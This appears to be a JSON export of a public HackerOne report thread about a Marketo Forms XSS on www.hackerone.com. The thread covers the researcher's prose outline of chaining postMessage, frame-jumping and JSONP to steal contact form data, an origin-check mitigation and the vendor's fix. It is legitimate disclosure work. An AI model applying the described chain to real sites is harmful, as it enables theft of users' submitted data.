{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-08-24T12:02:13.778Z", 
    "voters": [
        "pajoda", 
        "flamezzz", 
        "smsecurity", 
        "sp1d3rs", 
        "cache-money", 
        "bl4de", 
        "jr0ch17", 
        "r0x33d", 
        "spam404", 
        "preben", 
        "and 108 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 207042, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-08-29T14:58:40.209Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP", 
    "is_member_of_team?": null, 
    "vote_count": 118, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-09-23T12:02:13.857Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "attachments": [
        {
            "file_name": "Screen_Shot_2017-02-17_at_05.07.40.png", 
            "type": "image/png", 
            "id": 161523, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223332Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2406628809d7838cb0fd8eae2001134ae623a56777eff13de824bcf9a59a4ac2"
        }, 
        {
            "file_name": "Marketo2.mp4", 
            "type": "video/mp4", 
            "id": 161524, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223332Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=76dfb2d5bf15e60b4695bb5addcf801b22b38e3cae1f194b8860e5c19af13d50"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-02-17T08:23:13.838Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-17T08:23:13.838Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks, @fransrosen. I just opened a case with Marketo about this issue, and I'll keep you in the loop.\n\nBesides removing their forms code, is there anything you see that we could do in the mean time to mitigate this from our perspective?", 
            "markdown_message": "<p>Thanks, <a href=\"/fransrosen\">@fransrosen</a>. I just opened a case with Marketo about this issue, and I&#39;ll keep you in the loop.</p>\n\n<p>Besides removing their forms code, is there anything you see that we could do in the mean time to mitigate this from our perspective?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1490858, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-17T08:55:36.073Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-17T08:55:36.073Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks @reed! Short answer: No.\n\nLong answer:\nYou could perhaps use a modified script instead of theirs, since their endpoint always responds with `Access-Control-Allow-Origin:*`, so the XDFrame could be created in a different context still sending data to it. \n\nThat would need you to:\n1. Have your own `forms2.min.js` located on for example a `hackerone-ext-content.com`-domain.\n2. Modify that script to load a different XDFrame also on `hackerone-ext-content.com`.\n3. That XDFrame could then either be locked down completely by you:\n    \n    ```js\n$(window).on(\"message\", function (e){\n          var origin = e.originalEvent.origin;\n          if(origin != \"https://www.hackerone.com\") return\n    ```\n    \n4. Which would make `postMessage` only work from your own origin.\n\nI think a future proper mitigation would be for Marketo to get the script to pass an origin to the XDFrame when the script is initalized, which would then be checked against the `origin` in the postMessage to only allow the original origin to talk with it.\n\nHope this helps.\n\nRegards,\nFrans", 
            "markdown_message": "<p>Thanks <a href=\"/reed\">@reed</a>! Short answer: No.</p>\n\n<p>Long answer:<br>\nYou could perhaps use a modified script instead of theirs, since their endpoint always responds with <code>Access-Control-Allow-Origin:*</code>, so the XDFrame could be created in a different context still sending data to it. </p>\n\n<p>That would need you to:</p>\n\n<ol>\n<li>Have your own <code>forms2.min.js</code> located on for example a <code>hackerone-ext-content.com</code>-domain.</li>\n<li>Modify that script to load a different XDFrame also on <code>hackerone-ext-content.com</code>.</li>\n<li>\n<p>That XDFrame could then either be locked down completely by you:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">){</span>\n      <span class=\"kd\">var</span> <span class=\"nx\">origin</span> <span class=\"o\">=</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">originalEvent</span><span class=\"p\">.</span><span class=\"nx\">origin</span><span class=\"p\">;</span>\n      <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">origin</span> <span class=\"o\">!=</span> <span class=\"s2\">&quot;https://www.hackerone.com&quot;</span><span class=\"p\">)</span> <span class=\"k\">return</span>\n</code></pre>\n</li>\n<li><p>Which would make <code>postMessage</code> only work from your own origin.</p></li>\n</ol>\n\n<p>I think a future proper mitigation would be for Marketo to get the script to pass an origin to the XDFrame when the script is initalized, which would then be checked against the <code>origin</code> in the postMessage to only allow the original origin to talk with it.</p>\n\n<p>Hope this helps.</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 1490900, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-26T04:24:52.931Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-26T04:24:52.931Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 1506072, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-03T22:30:11.207Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-03T22:30:11.207Z", 
            "actor": {
                "username": "ebrynne", 
                "url": "/ebrynne", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/191/caa360ba5182e4fd7930e394d9fa654d468e6a20_medium.?1461015075"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey Frans!\n\nJust touching base, wanted to let you know we were still trucking away on this. \n\nThanks!\n\n\nEvan", 
            "markdown_message": "<p>Hey Frans!</p>\n\n<p>Just touching base, wanted to let you know we were still trucking away on this. </p>\n\n<p>Thanks!</p>\n\n<p>Evan</p>\n", 
            "type": "Activities::Comment", 
            "id": 1518425, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-20T10:52:44.626Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-20T10:52:44.626Z", 
            "actor": {
                "username": "dirk", 
                "url": "/dirk", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/067/e7167a07a5015ff170d3c52c5ceba1950d4ce382_medium.jpeg?1413381336"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @fransrosen,\n\nWe're currently awaiting a response from Marketo, sorry for delay!\n\nCheers,\nDirk", 
            "markdown_message": "<p>Hey <a href=\"/fransrosen\">@fransrosen</a>,</p>\n\n<p>We&#39;re currently awaiting a response from Marketo, sorry for delay!</p>\n\n<p>Cheers,<br>\nDirk</p>\n", 
            "type": "Activities::Comment", 
            "id": 1551858, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-29T07:47:50.129Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-29T07:47:50.129Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Marketo is still working on this. I'll poke them again.", 
            "markdown_message": "<p>Marketo is still working on this. I&#39;ll poke them again.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1569661, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-01T08:19:15.915Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-01T08:19:15.915Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Spoke to Marketo, and their ETA for a fix is late June during their next major update. Sounds like this \"fix\" will be opt-in as well, as apparently, customers rely on this security issue. We'll keep this open until it's resolved, though.", 
            "markdown_message": "<p>Spoke to Marketo, and their ETA for a fix is late June during their next major update. Sounds like this &quot;fix&quot; will be opt-in as well, as apparently, customers rely on this security issue. We&#39;ll keep this open until it&#39;s resolved, though.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1646072, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-05T07:41:48.852Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-05T07:41:48.852Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks guys for the updates! Looking forward into getting this resolved.\n\nCheers,\nFrans", 
            "markdown_message": "<p>Thanks guys for the updates! Looking forward into getting this resolved.</p>\n\n<p>Cheers,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 1655893, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-11T06:11:09.328Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-11T06:11:09.328Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Marketo provided this update today:\n\n> Our Engineering team has confirmed that they are updating our systems to allow customers to set custom CORS headers for their landing pages and forms.\n>\n> The planned release is currently set for our Q2 release. \n>\n> You can track the release via:\n> http://docs.marketo.com/display/public/DOCS/2017+Release+Schedule\n\n@fransrosen, do you feel that allowing us to disable CORS for their endpoint would actually solve this? Seems like not the optimal fix to me at all...", 
            "markdown_message": "<p>Marketo provided this update today:</p>\n\n<blockquote>\n<p>Our Engineering team has confirmed that they are updating our systems to allow customers to set custom CORS headers for their landing pages and forms.</p>\n\n<p>The planned release is currently set for our Q2 release. </p>\n\n<p>You can track the release via:<br>\n<a title=\"http://docs.marketo.com/display/public/DOCS/2017+Release+Schedule\" href=\"/redirect?signature=e3a2fd001cca1ef035e90ae49ac5a744b1019008&amp;url=http%3A%2F%2Fdocs.marketo.com%2Fdisplay%2Fpublic%2FDOCS%2F2017%2BRelease%2BSchedule\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://docs.marketo.com/display/public/DOCS/2017+Release+Schedule</span><i class=\"icon-external-link\"></i></a></p>\n</blockquote>\n\n<p><a href=\"/fransrosen\">@fransrosen</a>, do you feel that allowing us to disable CORS for their endpoint would actually solve this? Seems like not the optimal fix to me at all...</p>\n", 
            "type": "Activities::Comment", 
            "id": 1667337, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-11T06:46:24.412Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-11T06:46:24.412Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "That's interesting. It doesn't sound like that will solve anything regarding this issue, but it depends on what they mean with `set custom CORS headers`. I mean, if that will restrict what params to allow to be sent using `postMessage` to `$.ajax`, that would mitigate the first step in my PoC, limiting getting the XSS on the marketo.com-domain. \n\nHowever, I would assume that is not what they mean.\n\nIn my PoC above, there's nothing that abuses too open CORS-headers, I use postMessage to Marketo to XSS one iframe, launching www.hackerone.com from it, giving me cross window-access to the Marketo-iframe on www.hackerone.com. Allowing me, due to the first XSS, to also XSS the iframe on www.hackerone.com taking over the `postMessage`-listener to steal the data. \n\nHope you can make them understand this might not be a sufficient patch.", 
            "markdown_message": "<p>That&#39;s interesting. It doesn&#39;t sound like that will solve anything regarding this issue, but it depends on what they mean with <code>set custom CORS headers</code>. I mean, if that will restrict what params to allow to be sent using <code>postMessage</code> to <code>$.ajax</code>, that would mitigate the first step in my PoC, limiting getting the XSS on the marketo.com-domain. </p>\n\n<p>However, I would assume that is not what they mean.</p>\n\n<p>In my PoC above, there&#39;s nothing that abuses too open CORS-headers, I use postMessage to Marketo to XSS one iframe, launching <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> from it, giving me cross window-access to the Marketo-iframe on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a>. Allowing me, due to the first XSS, to also XSS the iframe on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> taking over the <code>postMessage</code>-listener to steal the data. </p>\n\n<p>Hope you can make them understand this might not be a sufficient patch.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1667387, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-22T23:21:26.977Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-22T23:21:26.977Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "I provided your feedback to Marketo, but haven't heard anything back from them. Will poke again.", 
            "markdown_message": "<p>I provided your feedback to Marketo, but haven&#39;t heard anything back from them. Will poke again.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1693378, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-05-23T06:59:10.586Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-23T06:59:10.586Z", 
            "actor": {
                "url": "/security", 
                "profile": {
                    "name": "HackerOne"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
                }
            }, 
            "team_handle": "security", 
            "bonus_amount": "0.0", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "message": "While Marketo hasn't yet fixed the issue (and it's unfortunate that it is taking them this long), we want to go ahead and award a bounty based on what we understand the severity of the issue and how it affects us.\n\nAs always, we are super appreciative of the creativity and thoroughness of your reports, and we welcome many more future reports like this.\n\nHappy hacking! :)", 
            "markdown_message": "<p>While Marketo hasn&#39;t yet fixed the issue (and it&#39;s unfortunate that it is taking them this long), we want to go ahead and award a bounty based on what we understand the severity of the issue and how it affects us.</p>\n\n<p>As always, we are super appreciative of the creativity and thoroughness of your reports, and we welcome many more future reports like this.</p>\n\n<p>Happy hacking! :)</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1694057, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-29T23:09:41.185Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-29T23:09:41.185Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks a lot guys! Looking forward to getting this resolved and published :)", 
            "markdown_message": "<p>Thanks a lot guys! Looking forward to getting this resolved and published :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1708338, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-20T08:43:27.223Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-20T08:43:27.223Z", 
            "actor": {
                "username": "dirk", 
                "url": "/dirk", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/067/e7167a07a5015ff170d3c52c5ceba1950d4ce382_medium.jpeg?1413381336"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @fransrosen,\n\nI wanted to let you know we're still waiting for Marketo, sorry for the long wait!", 
            "markdown_message": "<p>Hey <a href=\"/fransrosen\">@fransrosen</a>,</p>\n\n<p>I wanted to let you know we&#39;re still waiting for Marketo, sorry for the long wait!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1767713, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-21T22:44:08.776Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-21T22:44:08.776Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks Dirk, looking forward to getting this stuff fixed.. :)", 
            "markdown_message": "<p>Thanks Dirk, looking forward to getting this stuff fixed.. :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1773027, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-24T06:44:53.235Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-24T06:44:53.235Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi,\nI noticed the XDFrame was now updated to:\n\n```js\nvar params = { type:\"POST\", dataType:\"json\", url:p.url, data:p.data, crossDomain:false, jsonp:false };\n```\n\nIf I'm not mistaken, this means that only the message sending the data through postMessage will be able to decide where the POST-data is sent, and we're not able to utilize JSONP to trigger an XSS on the marketo-domain, as it's disabled in the ajax-params. I would call this a proper fix!\n\nTook a while, but finally!", 
            "markdown_message": "<p>Hi,<br>\nI noticed the XDFrame was now updated to:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">var</span> <span class=\"nx\">params</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"na\">type</span><span class=\"p\">:</span><span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span> <span class=\"na\">dataType</span><span class=\"p\">:</span><span class=\"s2\">&quot;json&quot;</span><span class=\"p\">,</span> <span class=\"na\">url</span><span class=\"p\">:</span><span class=\"nx\">p</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">,</span> <span class=\"na\">data</span><span class=\"p\">:</span><span class=\"nx\">p</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"na\">crossDomain</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span> <span class=\"na\">jsonp</span><span class=\"p\">:</span><span class=\"kc\">false</span> <span class=\"p\">};</span>\n</code></pre>\n<p>If I&#39;m not mistaken, this means that only the message sending the data through postMessage will be able to decide where the POST-data is sent, and we&#39;re not able to utilize JSONP to trigger an XSS on the marketo-domain, as it&#39;s disabled in the ajax-params. I would call this a proper fix!</p>\n\n<p>Took a while, but finally!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1951038, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "created_at": "2017-08-24T11:59:19.187Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-24T11:59:19.187Z", 
            "actor": {
                "username": "joystick", 
                "url": "/joystick", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/167/228/b43a55557e4be10a26bd6d77132e2b0f1d35e4e3_medium.jpg?1515271617"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "security", 
            "message": "@fransrosen,\n\nThank you very much for the awesome report and for confirming the fix. We extend our apologies for the long delay which was due to circumstances beyond our control. Your effort is appreciated and we wish that you'll continue to research and submit any future security issues you find.\n\nRegards.\n@joystick ", 
            "markdown_message": "<p><a href=\"/fransrosen\">@fransrosen</a>,</p>\n\n<p>Thank you very much for the awesome report and for confirming the fix. We extend our apologies for the long delay which was due to circumstances beyond our control. Your effort is appreciated and we wish that you&#39;ll continue to research and submit any future security issues you find.</p>\n\n<p>Regards.<br>\n<a href=\"/joystick\">@joystick</a> </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1951668, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-24T12:02:13.799Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-24T12:02:13.799Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "first_to_agree": true, 
            "message": "Awesome, since they now have a fix in place, I would love to get it out there if possible.", 
            "markdown_message": "<p>Awesome, since they now have a fix in place, I would love to get it out there if possible.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1951671, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-29T14:58:40.230Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-29T14:58:40.230Z", 
            "actor": {
                "username": "jjoos", 
                "url": "/jjoos", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/059/cb73b092f2b4c8dd9aa17edd300a990e89f6154f_medium.gif?1385051703"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1963233, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-29T14:58:40.308Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-29T14:58:40.308Z", 
            "actor": {
                "username": "jjoos", 
                "url": "/jjoos", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/059/cb73b092f2b4c8dd9aa17edd300a990e89f6154f_medium.gif?1385051703"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1963234, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "fransrosen", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/fransrosen", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/634/6e02242b5d1d893cef698144faa706fd1d75fea0_small.jpg?1396468576"
